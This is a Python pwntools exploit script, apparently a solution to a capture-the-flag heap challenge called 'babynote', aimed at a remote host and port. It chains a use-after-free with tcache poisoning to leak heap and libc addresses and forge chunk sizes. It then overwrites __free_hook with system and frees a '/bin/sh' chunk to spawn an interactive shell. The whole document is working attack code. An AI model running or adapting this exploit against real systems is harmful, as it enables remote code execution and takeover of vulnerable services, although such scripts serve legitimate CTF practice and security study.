#!/usr/bin/env python3
from pwn import *

def create(size, payload):
    p.sendlineafter(b'Choice >', b'1')
    p.sendlineafter(b'Note size : ', str(size))
    p.sendafter(b'Content : ', payload)

def free(idx):
    p.sendlineafter(b'Choice >', b'4')
    p.sendlineafter(b'Note index : ', str(idx))
    
def show(idx):
    p.sendlineafter(b'Choice >', b'2')
    p.sendlineafter(b'Note index : ', str(idx))

def edit(idx, payload):
    p.sendlineafter(b'Choice >', b'3')
    p.sendlineafter(b'Note index : ', str(idx))
    p.sendafter(b'Content : ', payload)

binsize = 0x68
# p = process('./babynote', env={'LD_PRELOAD': './libc.so.6'})
p = remote('140.112.31.97', 30203)

create(binsize, b'a\n') # 0 (0)
create(binsize, b'a\n') # 1 (1)

free(0) # (0)
free(1) # (1) -> (0)

create(binsize, b'a\n') # 2 (1,2)

free(1) # (1,2) -> (0)

show(2)
heap = u64(p.recvline()[:-1].ljust(8, b'\0')) - 0x2a0
log.info('heap: ' + hex(heap))

target = p64(heap + 0x390)
edit(2, target) # (1,2) -> (target)

payload  = p64(0) + p64(0x4a1)
create(0x78, payload + b'\n') # 3

create(binsize, b'\n') # 4 (1,2,4)
create(binsize, b'\n') # 5 (5,target)

free(0) # (0)
free(1) # (1,2,4) -> (0)

target2 = p64(heap + 0x390 + 0x4a0 - 0x10)
edit(2, target2) # (1,2,4) -> (target2)

create(binsize, b'\n') # 6 (1,2,4,6)
payload  = p64(0) + p64(0x21)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0x21)
create(binsize, payload + b'\n') # 7 (7,target2)

free(5)

edit(3, b'a'*0x18)

show(3)

p.recvuntil(b'a'*0x18)
unsorted_bin = u64(p.recvline()[:-1].ljust(8, b'\0'))
libc = unsorted_bin - 0x1ebbe0
__free_hook = libc + 0x1eeb28
system = libc + 0x55410
log.info('libc: ' + hex(libc))

free(0) # (0)
free(1) # (1,2,4,6) -> (0)

edit(2, p64(__free_hook)) # (1,2,4,6) -> (__free_hook)
create(binsize, b'/bin/sh\0') # 8 (1,2,4,6,8)
create(binsize, p64(system) + b'\n') # 9 (9, __free_hook)

free(1)

p.interactive()
